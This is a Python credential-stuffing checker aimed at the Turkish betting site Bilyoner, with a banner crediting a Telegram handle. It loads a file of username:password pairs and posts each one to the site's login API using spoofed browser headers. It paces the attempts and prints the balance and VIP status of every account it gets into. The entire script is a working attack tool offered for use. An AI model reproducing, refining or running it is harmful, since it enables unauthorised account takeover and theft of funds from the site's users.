import requests, json, time



E = '\033[1;31m'
G = '\033[1;35m'
Z = '\033[1;31m'  # احمر
X = '\033[1;33m'  # اصفر
Z1 = '\033[2;31m'  # احمر ثاني
F = '\033[2;32m'  # اخضر
A = '\033[2;34m'  # ازرق
C = '\033[2;35m'  # وردي
B = '\x1b[38;5;208m'  # برتقالي
Y = '\033[1;34m'  # ازرق فاتح
M = '\x1b[1;37m'  # ابیض
S = '\033[1;33m'

bss = 0
uus = 0
hit = 0
bad = 0

print(f'''{B}{F}━━━━━━━━━━━━━⧪━━━━━━━━━━━━━{B}
|{Z}[+] TeleGram  : {B} @Roox_00    |
|{Z}[+] Chanel  : {B}JED ~ ARCHIVE |
|{Z}[+] Tool  : {B} Bilyoner Checker |
{F}━━━━━━━━━━━━━⧪━━━━━━━━━━━━━━━━━━ ''')



def arafxp(Arafqwe):
    with open(Arafqwe, "r", encoding="utf-8") as Arafasd:
        return [Arafzxc.strip().split(":") for Arafzxc in Arafasd if ":" in Arafzxc]

def arafjsi(Arafbnm, Arafyui):
    Arafurl = "https://aping.bilyoner.com/v2/oauth-manager/users/login"
    Arafdata = {
        "username": Arafbnm,
        "password": Arafyui,
        "clientId": "mobile.bilyoner.com"
    }

    Arafhed = {
        "host": "aping.bilyoner.com",
        "connection": "keep-alive",
        "accept": "application/json, text/plain, */*",
        "x-client-browser-version": "Opera / v73.0.3856.396",
        "x-client-channel": "WEB",
        "content-type": "application/json;charset=UTF-8",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36 OPR/73.0.3856.396",
        "x-device-id": "B95B8EAA-4251-4B04-9AC6-C3542C05658D",
        "x-client-app-version": "2.0.9",
        "origin": "https://www.bilyoner.com",
        "sec-fetch-site": "same-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://www.bilyoner.com/",
        "accept-language": "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7",
        "accept-encoding": "gzip, deflate",
        "content-length": "82"
    }

    Arafres = requests.post(Arafurl, json=Arafdata, headers=Arafhed)

    if Arafres.status_code == 200 and '"balance":' in Arafres.text:
        print("giris basarili")
        return facelog(Arafres.text)
    else:
        print("giris basarisiz")
        return None

def facelog(Araftext):
    try:
        Arafdata = json.loads(Araftext)
        Arafbakiye = Arafdata.get("balance", "bilgi yok")
        Arafvip = "VAR" if Arafdata.get("isVip", False) else "YOK"
        print(f"bakiye: {Arafbakiye} ₺, vip: {Arafvip}")
    except:
        print("bilgi cekilemedi")

Arafnmj = input("dosya adini gir ")
Arafuhb = arafxp(Arafnmj)

for Arafyhn, Araftgb in Arafuhb:
    arafjsi(Arafyhn, Araftgb)
    time.sleep(3.4)
